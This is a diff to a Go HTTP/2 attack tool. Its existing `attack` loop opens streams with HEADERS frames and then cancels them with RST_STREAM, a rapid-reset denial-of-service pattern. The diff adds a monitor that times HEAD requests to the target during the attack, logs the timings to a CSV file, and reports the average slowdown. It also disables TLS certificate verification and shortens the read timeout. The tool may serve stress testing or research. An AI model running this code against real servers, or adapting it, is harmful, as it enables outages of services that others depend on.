@@ -3,11 +3,15 @@ package main
 import (
 	"bytes"
 	"crypto/tls"
+	"encoding/csv"
 	"flag"
 	"fmt"
 	"log"
+	"net/http"
 	"net/url"
+	"os"
 	"strings"
+	"sync"
 	"sync/atomic"
 	"time"
 
@@ -91,6 +95,54 @@ func createHeaderFrameParam(url *url.URL, streamId uint32) http2.HeadersFramePar
 	}
 }
 
+func monitor(client *http.Client) (measurement time.Duration, err error) {
+	start := time.Now()
+	_, err = client.Head(*serverUrl)
+	if err != nil {
+		log.Printf("monitor request failed: %v", err)
+	}
+	end := time.Now()
+	measurement = end.Sub(start)
+	
+	time.Sleep(time.Duration(1) * time.Second)
+
+	log.Printf("HEAD request took %v", measurement)
+
+	return measurement, err
+}
+
+func monitorPerformance(ch chan <- time.Duration, doneFlag *bool) {
+	f, err := os.Create("monitor.log")
+	if err != nil {
+		log.Fatalf("failed opening logfile: %v", err)
+	}
+
+	csvWriter := csv.NewWriter(f)
+	csvWriter.Comma=';'
+	tr := &http.Transport{
+		TLSClientConfig: &tls.Config{InsecureSkipVerify: true},
+	}
+	client := &http.Client{Transport: tr}
+
+	avg := 0.0
+	var total int64
+	var i int64 = 1
+	for !*doneFlag {
+		time.Sleep(time.Millisecond * time.Duration(500))
+		val, err := monitor(client)
+		if err != nil {
+			log.Printf("ERROR DURING MONITORING: %v", err)
+			continue
+		}
+		total += val.Milliseconds()
+		avg = float64(total) / float64(i + 1)
+		i++
+		csvWriter.Write([]string{time.Now().String(), val.String()})	
+	}
+	csvWriter.Flush()
+	ch <- time.Duration(avg) * time.Millisecond
+}
+
 func main() {
 	flag.Parse()
 	serverUrl, err := url.Parse(*serverUrl)
@@ -103,12 +155,24 @@ func main() {
 		NextProtos:         []string{"h2"},
 	}
 
+	done := false
+
+	monitorCh := make(chan time.Duration)
+	go monitorPerformance(monitorCh, &done)
+
 	ch := make(chan ReadFrameResult, *connections)
+	wg := &sync.WaitGroup{}
 	for i := 0; i < *connections; i++ {
 		log.Printf("create connection %d", i)
-		go execute(serverUrl, conf, ch, i)
+		wg.Add(1)
+		go execute(serverUrl, conf, ch, i, wg)
 	}
 
+	wg.Wait()
+	done = true
+	
+	avg := <- monitorCh
+	log.Printf("average HTTP/1 response time: %v", avg)
 	summarize(ch)
 }
 
@@ -161,7 +225,7 @@ func printResult(result ReadFrameResult) {
 	fmt.Printf("\tReason for stopping to listen for more packets: %s\n", reason)
 }
 
-func execute(serverUrl *url.URL, conf *tls.Config, ch chan<- ReadFrameResult, connId int) {
+func execute(serverUrl *url.URL, conf *tls.Config, ch chan<- ReadFrameResult, connId int, wg *sync.WaitGroup) {
 	conn, err := tls.Dial("tcp", serverUrl.Host, conf)
 	if err != nil {
 		log.Fatalf("error establishing connection to %s: %v", serverUrl.Host, err)
@@ -207,6 +271,7 @@ func execute(serverUrl *url.URL, conf *tls.Config, ch chan<- ReadFrameResult, co
 	ch <- readFrames(conn, connId)
 
 	conn.Close()
+	wg.Done()
 }
 
 func readFrames(conn *tls.Conn, connId int) ReadFrameResult {
@@ -215,7 +280,7 @@ func readFrames(conn *tls.Conn, connId int) ReadFrameResult {
 		Conn: connId,
 	}
 
-	readDuration := 10 * time.Second
+	readDuration := 1 * time.Second
 	for {
 		conn.SetReadDeadline(time.Now().Add(readDuration))
 		frame, err := framer.ReadFrame()
@@ -259,19 +324,19 @@ func attack(framer *http2.Framer, url *url.URL, streamCounter *atomic.Uint32) {
 		streamCounter.Add(2)
 		err := framer.WriteHeaders(createHeaderFrameParam(url, streamId))
 		if err != nil {
-			log.Println("unable to send initial HEADERS frame")
+			log.Println("[stream %d] unable to send initial HEADERS frame", streamId)
 			return
 		}
-		log.Printf("sent initial headers on stream %d", streamId)
+		log.Printf("[stream %d] sent initial headers", streamId)
 
-		log.Printf("now sleeping for %d milliseconds", *sleep)
+		log.Printf("[stream %d] now sleeping for %d milliseconds", streamId, *sleep)
 		time.Sleep(time.Millisecond * time.Duration(*sleep))
 
 		err = framer.WriteRSTStream(streamId, http2.ErrCodeCancel)
 		if err != nil {
-			log.Printf("unable to write RST_STREAM frame: %v", err)
+			log.Printf("[stream %d] unable to write RST_STREAM frame: %v", streamId, err)
 			return
 		}
-		log.Print("Wrote RST_STREAM frame")
+		log.Printf("[stream %d] Wrote RST_STREAM frame", streamId)
 	}
 }
